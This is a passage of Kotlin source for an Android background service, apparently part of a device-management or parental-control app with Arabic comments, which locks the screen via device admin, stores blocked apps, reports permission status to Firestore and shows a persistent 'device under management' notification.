                        "source"    to "CommandListenerService",
                    )
                )
        } catch (e: Exception) {
            android.util.Log.w("CommandListenerSvc", "فشل تسجيل الأمر في audit log: ${e.message}")
        }
    }

    private fun lockScreen() {
        val dpm = getSystemService(Context.DEVICE_POLICY_SERVICE)
                as android.app.admin.DevicePolicyManager
        val comp = ComponentName(this, MyDeviceAdminReceiver::class.java)
        if (dpm.isAdminActive(comp)) {
            dpm.lockNow()
            android.util.Log.i("CommandListenerSvc", "✓ الشاشة مُقفلة")
        } else {
            android.util.Log.w("CommandListenerSvc", "Device Admin غير نشط — قفل الشاشة فشل")
        }
    }

    private fun saveBlockedAppsToPrefs(packages: List<String>) {
        getSharedPreferences(PREF_FILE, Context.MODE_PRIVATE)
            .edit()
            .putStringSet("blocked_apps", packages.toSet())
            .apply()
        android.util.Log.i("CommandListenerSvc", "قائمة الحجب محدَّثة: ${packages.size} تطبيق")
    }

    // ── رفع حالة الجهاز لـ Firestore ──────────────────────────

    private fun reportDeviceState(uid: String) {
        val dpm = getSystemService(Context.DEVICE_POLICY_SERVICE)
                as android.app.admin.DevicePolicyManager
        val comp = ComponentName(this, MyDeviceAdminReceiver::class.java)
        val pm   = getSystemService(Context.POWER_SERVICE) as PowerManager

        val data: Map<String, Any> = mapOf(
            "permissions" to mapOf(
                "deviceAdmin"         to dpm.isAdminActive(comp),
                "accessibility"       to isAccessibilityEnabled(),
                "overlay"             to Settings.canDrawOverlays(this),
                "batteryOptimization" to pm.isIgnoringBatteryOptimizations(packageName),
            ),
            "lastSeen" to Timestamp.now(),
        )

        FirebaseFirestore.getInstance()
            .collection("device_states")
            .document(uid)
            .set(data, SetOptions.merge())
    }

    private fun isAccessibilityEnabled(): Boolean {
        val expected = "$packageName/${MyAccessibilityService::class.java.canonicalName}"
        val enabled  = Settings.Secure.getString(
            contentResolver, Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES
        ) ?: return false
        val splitter = TextUtils.SimpleStringSplitter(':')
        splitter.setString(enabled)
        while (splitter.hasNext()) {
            if (splitter.next().equals(expected, ignoreCase = true)) return true
        }
        return false
    }

    // ── WakeLock ───────────────────────────────────────────────

    private fun acquireWakeLock() {
        val pm = getSystemService(Context.POWER_SERVICE) as PowerManager
        wakeLock = pm.newWakeLock(
            PowerManager.PARTIAL_WAKE_LOCK,
            "CommandListenerService::WakeLock"
        ).also { it.acquire(10 * 60 * 1000L) } // 10 دقائق كحد أقصى
    }

    // ── Notification ───────────────────────────────────────────

    private fun buildNotification(): Notification {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                CHANNEL_ID,
                "خدمة أوامر الجهاز",
                NotificationManager.IMPORTANCE_LOW
            ).apply {
                description = "تستمع للأوامر الواردة من مشرف النظام"
                setShowBadge(false)
            }
            (getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager)
                .createNotificationChannel(channel)
        }

        return NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("الجهاز قيد الإدارة")
            .setContentText("النظام يستمع للأوامر في الخلفية")
            .setSmallIcon(R.mipmap.ic_launcher)
            .setOngoing(true)
            .setSilent(true)
            .setPriority(NotificationCompat.PRIORITY_LOW)
            .setCategory(NotificationCompat.CATEGORY_SERVICE)
            .setColor(0xFFC9A84C.toInt())
            .build()
    }
}
